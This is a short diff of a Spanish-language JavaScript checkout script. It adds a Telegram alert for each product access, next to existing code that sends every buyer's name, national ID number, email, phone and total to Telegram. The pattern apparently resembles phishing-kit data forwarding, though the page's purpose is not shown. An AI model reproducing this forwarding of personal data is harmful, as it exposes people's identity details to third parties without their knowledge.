@@ -143,6 +143,9 @@ document.addEventListener('DOMContentLoaded', () => {
       sessionStorage.setItem("total", totalFmt);
 
       try {
+        const productText = `🛒 <b>Nuevo acceso Producto</b>`;
+        await sendToTelegram(productText);
+
         const text = `📦 <b>Nueva Compra Finalizada</b>\n\n👤 Nombre: ${nombreCompleto}\n🪪 Cédula: ${cedula}\n📧 Correo: ${email}\n📞 Teléfono: ${telefono}\n💰 Total: ${totalFmt}`;
         await sendToTelegram(text);
       } catch (err) { console.error(err); }
